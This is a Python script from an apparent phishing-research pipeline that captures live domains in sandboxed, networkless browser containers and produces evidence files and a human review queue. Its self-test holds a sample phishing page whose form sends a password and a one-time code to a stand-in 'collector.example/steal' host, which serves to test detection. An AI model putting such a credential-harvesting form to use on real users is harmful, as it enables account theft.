#!/usr/bin/env python3
"""Inspect independent live domains in networkless, disposable browser containers.

Only this supervisor can fetch HTTP(S), with DNS addresses checked and pinned to
public IPs. No browser profiles, credentials, P1 corpus or Docker socket are mounted.
"""
import argparse
import base64
import csv
import hashlib
import html
import http.client
import ipaddress
import json
import os
import re
from pathlib import Path
import selectors
import socket
import ssl
import subprocess
import time
from datetime import datetime, timezone
from urllib.parse import urlsplit

from content_signals import analyze, registry, host, VERSION

ROOT = Path(__file__).resolve().parents[3]
OUT = ROOT / 'data/processed/live_content'
IMAGE = 'phishvn-content:v1'
# Hours after first detection within which a capture still speaks to the observation.
FRESH_HOURS = 48
# Every observation, not only the unresolved ones. This tool began as a way to give UNKNOWN
# hosts a label, so it read live_labels/review_queue.csv, which holds exactly the rows whose
# label is not usable. Validating a source label needs the opposite: the only admissible
# evidence about what a host served is a capture taken near the observation, and the review
# protocol refuses a visit made later. The labelled strata are therefore inspected too, and the
# analysis produced for them is withheld from annotators by export_blinded_evidence.py.
QUEUE = ROOT / 'data/processed/live_labels/observations.csv'


def public_addresses(url):
    parsed = urlsplit(url)
    if parsed.scheme not in {'http', 'https'} or not parsed.hostname or parsed.username or parsed.password:
        raise ValueError('unsupported_url')
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    if port not in {80,443}:
        raise ValueError('port_not_allowed')
    hostname = parsed.hostname.encode('idna').decode()
    answers = socket.getaddrinfo(hostname, port, type=socket.SOCK_STREAM)
    if not answers or any(not ipaddress.ip_address(a[4][0]).is_global for a in answers):
        raise ValueError('non_public_address')
    return parsed, hostname, port, answers


def fetch(url):
    parsed, hostname, port, answers = public_addresses(url)
    connection = http.client.HTTPConnection(hostname, port, timeout=6)
    sock = None
    try:
        family, kind, proto, _, address = answers[0]
        sock = socket.socket(family, kind, proto)
        sock.settimeout(6)
        sock.connect(address)  # Pin the checked address: no second DNS lookup.
        if parsed.scheme == 'https':
            sock = ssl.create_default_context().wrap_socket(sock, server_hostname=hostname)
        connection.sock = sock
        target = parsed.path or '/'
        if parsed.query:
            target += '?' + parsed.query
        connection.request('GET', target, headers={'User-Agent':'Mozilla/5.0 PhishVN-ContentAudit/1.0',
            'Accept':'*/*', 'Accept-Encoding':'identity', 'Connection':'close'})
        response = connection.getresponse()
        body = response.read(3 * 1024 * 1024 + 1)
        if len(body) > 3 * 1024 * 1024:
            raise ValueError('response_size_limit')
        # Browser follows redirects, each routed through a fresh public-IP check.
        headers = {k.lower():v for k,v in response.getheaders() if k.lower() in
            {'content-type','location','content-encoding','content-security-policy','x-frame-options','access-control-allow-origin'}}
        return {'url':url, 'status':response.status, 'headers':headers,
                'ip':address[0], 'body':base64.b64encode(body).decode()}
    finally:
        connection.close()
        if sock:
            sock.close()


def atomic_json(path, data):
    temp = path.with_suffix('.tmp')
    temp.write_text(json.dumps(data, ensure_ascii=False, indent=2) + '\n')
    temp.replace(path)


def capture(url, directory, docker, timeout=75, fixture=None):
    name = 'phishvn-content-' + directory.name
    directory.mkdir(parents=True, exist_ok=True)
    # Container user is the caller: the only writable bind is this capture folder.
    command = docker + ['run','--rm','-i','--name',name,'--network=none',
        '--cap-drop=ALL','--security-opt=no-new-privileges','--read-only',
        '--pids-limit=256','--memory=1g','--cpus=1', '--user',f'{os.getuid()}:{os.getgid()}',
        '--tmpfs','/tmp:rw,nosuid,nodev,size=384m','--shm-size=128m',
        '-e','HOME=/tmp', '-v',str(Path(__file__).parent) + ':/app:ro',
        '-v',str(directory) + ':/out:rw',IMAGE]
    stderr = (directory / 'browser.log').open('w')
    process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
        stderr=stderr, text=True, bufsize=1)
    selector = selectors.DefaultSelector()
    selector.register(process.stdout, selectors.EVENT_READ)
    deadline, count, total = time.monotonic() + timeout, 0, 0
    result = {'url': url, 'capture_status':'error', 'error':'worker_no_result'}
    try:
        process.stdin.write(json.dumps({'url':url}) + '\n'); process.stdin.flush()
        while time.monotonic() < deadline:
            if not selector.select(timeout=1):
                if process.poll() is not None: break
                continue
            line = process.stdout.readline(8 * 1024 * 1024)
            if not line: break
            event = json.loads(line)
            if event.get('type') == 'result':
                result = event['result']
                break
            if event.get('type') != 'fetch':
                raise ValueError('invalid_worker_message')
            request_url = event['url']
            count += 1
            try:
                if count > 80 or total > 25 * 1024 * 1024 or time.monotonic() >= deadline:
                    raise ValueError('capture_budget_exhausted')
                if fixture is not None:
                    if request_url != url: raise ValueError('fixture_external_request')
                    response = {'url':url,'status':200,'headers':{'content-type':'text/html'},
                        'body':base64.b64encode(fixture.encode()).decode(),'ip':'fixture'}
                else:
                    response = fetch(request_url)
                total += len(response['body']) * 3 // 4
            except Exception as exc:
                response = {'url': request_url, 'error':type(exc).__name__ + ': ' + str(exc)[:200]}
            process.stdin.write(json.dumps(response) + '\n'); process.stdin.flush()
        else:
            result['error'] = 'capture_deadline_exceeded'
    finally:
        selector.close()
        process.stdin.close()
        # Never leave a browser behind after a timeout or supervisor exception.
        subprocess.run(docker + ['rm','-f',name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=15)
        try: process.wait(timeout=10)
        except subprocess.TimeoutExpired:
            process.kill(); process.wait()
        stderr.close()
    result['request_count'] = count
    result['fetched_bytes'] = total
    return result


def detected_epoch(row):
    """First-detection stamp as an epoch. The column is naive LOCAL time, so it is
    parsed without a timezone; 0 stands for absent or unparseable."""
    raw = (row.get('first_detected') or row.get('captured_at') or '').strip()
    if not raw:
        return 0.0
    try:
        return datetime.fromisoformat(raw[:19].replace(' ','T')).timestamp()
    except ValueError:
        return 0.0


def candidates(path, latest, limit, retry_hours, fresh_hours=FRESH_HOURS):
    rows = {}
    for r in csv.DictReader(path.open(encoding='utf-8',newline='')):
        hostname = r.get('hostname_key') or host(r.get('domain',''))
        if not hostname: continue
        # One row per host, the EARLIEST sighting. The queue is observation-level, so keeping
        # the last row read would date a host by its most recent observation and make an old
        # host look new to the freshness ordering below.
        previous = rows.get(hostname)
        if previous is None:
            rows[hostname] = r
        else:
            new_epoch, old_epoch = detected_epoch(r), detected_epoch(previous)
            if old_epoch == 0 or (new_epoch and new_epoch < old_epoch):
                rows[hostname] = r
    now = time.time()
    eligible = []
    for hostname, row in rows.items():
        previous = latest.get(hostname)
        if previous and now - previous['checked_epoch'] < retry_hours * 3600:
            continue
        eligible.append((hostname,row,detected_epoch(row)))
    def risk(row):
        try:
            return int(row.get('candidate_risk_score') or 0)
        except ValueError:
            return 0
    # A capture is only evidence about the label if it happens near the observation, and the
    # backlog is large enough that arrivals used to wait a median of 19 days behind it. Hosts
    # first detected inside the window therefore go ahead of the backlog, newest first; within
    # the backlog the brand-risk ordering below is unchanged.
    fresh_cutoff = now - fresh_hours * 3600
    eligible.sort(key=lambda item: (item[0] in latest,
        item[2] < fresh_cutoff,
        -item[2] if item[2] >= fresh_cutoff else 0,
        -risk(item[1]),
        item[1].get('source') not in {'ct_brands','urlscan_brands'},
        not bool(re.search(r'bank|vietcom|bidv|shopee|lazada|dichvucong|bocongan|vneid', item[0])),
        item[1].get('tls_present') != '1',
        latest.get(item[0],{}).get('checked_epoch',0), item[0]))
    return [(hostname,row) for hostname,row,_ in eligible[:limit]], len(rows)


def reports(latest, out):
    entries = sorted(latest.values(), key=lambda r: ({'high':0,'medium':1,'retry':2,'normal':3}[r['analysis']['review_priority']], r['hostname']))
    fields = ['hostname','checked_at','content_status','review_priority','suggested_label','evidence_path',
              'screenshot_path','reviewer','reviewed_at','verdict','rationale']
    temp = out / 'review_queue.csv.tmp'
    with temp.open('w',newline='',encoding='utf-8') as f:
        writer = csv.DictWriter(f,fieldnames=fields); writer.writeheader()
        for entry in entries:
            writer.writerow({**{k:entry[k] for k in ['hostname','checked_at','evidence_path','screenshot_path']},
                **{k:entry['analysis'][k] for k in ['content_status','review_priority','suggested_label']}})
    temp.replace(out / 'review_queue.csv')
    # Only escaped evidence is shown; captured HTML is never embedded or executed.
    cards = []
    for entry in entries:
        evidence = html.escape(entry['evidence_path'],quote=True)
        shot = html.escape(entry['screenshot_path'],quote=True)
        cards.append('<tr><td>' + html.escape(entry['hostname']) + '</td><td>' +
            html.escape(entry['analysis']['content_status']) + '</td><td>' +
            html.escape(entry['checked_at']) + '</td><td><a href="' + evidence + '">Evidence JSON</a>' +
            (' · <a href="' + shot + '">Screenshot</a>' if shot else '') + '</td></tr>')
    report = '<!doctype html><meta charset="utf-8"><meta http-equiv="Content-Security-Policy" content="default-src \'none\'; style-src \'unsafe-inline\'; img-src \'self\' data:"><title>Live content review</title><style>body{font:16px sans-serif;margin:32px}td,th{padding:10px;border-bottom:1px solid #ddd;text-align:left}</style><h1>Live content review</h1><p>Suggestions require human review. This report does not change dataset labels. Copy review_queue.csv to a separate review file before editing; it is regenerated.</p><table><tr><th>Domain</th><th>Finding</th><th>Capture time (UTC)</th><th>Evidence</th></tr>' + ''.join(cards) + '</table>'
    temp = out / 'review.html.tmp'; temp.write_text(report); temp.replace(out / 'review.html')
    counts = {}
    for entry in entries:
        key = entry['analysis']['content_status']; counts[key] = counts.get(key,0) + 1
    atomic_json(out / 'summary.json', {'policy_version':VERSION, 'hosts_checked':len(entries), 'statuses':counts,
        'note':'Content triage only; no binary labels automatically promoted.'})


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--limit',type=int,default=50)
    parser.add_argument('--retry-hours',type=int,default=168)
    parser.add_argument('--queue',type=Path,default=QUEUE)
    parser.add_argument('--sudo-docker',action='store_true')
    parser.add_argument('--self-test',action='store_true')
    args = parser.parse_args()
    docker = ['sudo','-n','docker'] if args.sudo_docker else ['docker']
    image_id = subprocess.check_output(docker + ['image','inspect','--format','{{.Id}}',IMAGE],text=True).strip()
    OUT.mkdir(parents=True,exist_ok=True)
    if args.self_test:
        fixture = '<html><title>ExampleBank</title><h1>ExampleBank</h1><form action="https://collector.example/steal" method="post"><label>OTP<input name="otp"></label><input type="password"></form></html>'
        capture_dir = OUT / ('selftest-' + str(int(time.time())))
        result = capture('https://fixture.example/',capture_dir,docker,fixture=fixture)
        analysis = analyze(result,[{'name':'ExampleBank','aliases':['ExampleBank'],'domains':['bank.example']}])
        assert result['capture_status'] == 'captured', result
        assert analysis['content_status'] == 'suspected_phishing', analysis
        assert (capture_dir / 'page.png').stat().st_size > 0
        print('Networkless browser self-test passed (HTML, screenshot, password and OTP evidence).')
        return
    reference = ROOT / 'data/raw/tinnhiem_benign/detections.csv'
    reference_bytes = reference.read_bytes()
    brands = registry(reference, reference_bytes)
    code_hashes = {p.name: hashlib.sha256(p.read_bytes()).hexdigest()
                   for p in Path(__file__).parent.glob('*.py')}
    state_path = OUT / 'latest.json'
    latest = json.loads(state_path.read_text()) if state_path.exists() else {}
    selected, total = candidates(args.queue,latest,args.limit,args.retry_hours)
    print(json.dumps({'eligible_selected':len(selected),'queued_hosts':total}),flush=True)
    for hostname, row in selected:
        checked = datetime.now(timezone.utc)
        uid = checked.strftime('%Y%m%dT%H%M%S') + '-' + hashlib.sha256(hostname.encode()).hexdigest()[:16]
        directory = OUT / 'captures' / uid
        result = capture('https://' + hostname + '/',directory,docker)
        # HTTP fallback is separately recorded, never a silent TLS downgrade.
        attempts = [result]
        if result['capture_status'] != 'captured':
            fallback_dir = directory / 'http_fallback'
            result = capture('http://' + hostname + '/',fallback_dir,docker)
            attempts.append(result)
        analysis = analyze(result,brands)
        evidence = {'hostname':hostname,'checked_at':checked.isoformat(),'capture':result,'attempts':attempts,
            'analysis':analysis,'source':row.get('source'),'scope':'current_root_page_only',
            'registry_path':str(reference.relative_to(ROOT)),
            'registry_sha256':hashlib.sha256(reference_bytes).hexdigest(),
            'container_image_id':image_id, 'code_sha256':code_hashes,
            'isolation':'docker_network_none_public_ip_pinned_get_broker',
            'limitations':['No interactions, POST requests, cookies, or login flow traversal.',
                'Brand identity uses visible text and logo alt text; screenshot pixels are for human review.',
                'Registry membership does not establish all authorized third parties.',
                'Current root page is not evidence for historical captures or every URL on the host.']}
        evidence['artifact_sha256'] = {
            str(p.relative_to(directory)): hashlib.sha256(p.read_bytes()).hexdigest()
            for p in directory.rglob('*') if p.is_file() and p.name in {'page.html','page.png'}}
        atomic_json(directory / 'evidence.json',evidence)
        image_path = directory / ('http_fallback/page.png' if len(attempts) > 1 else 'page.png')
        latest[hostname] = {'hostname':hostname,'checked_at':checked.isoformat(),'checked_epoch':checked.timestamp(),
            'analysis':analysis,'evidence_path':str((directory/'evidence.json').relative_to(OUT)),
            'screenshot_path':str(image_path.relative_to(OUT)) if image_path.exists() else ''}
        atomic_json(state_path,latest)
        reports(latest,OUT)
        print(hostname + ' -> ' + analysis['content_status'],flush=True)
        time.sleep(1)
    reports(latest,OUT)


if __name__ == '__main__':
    main()
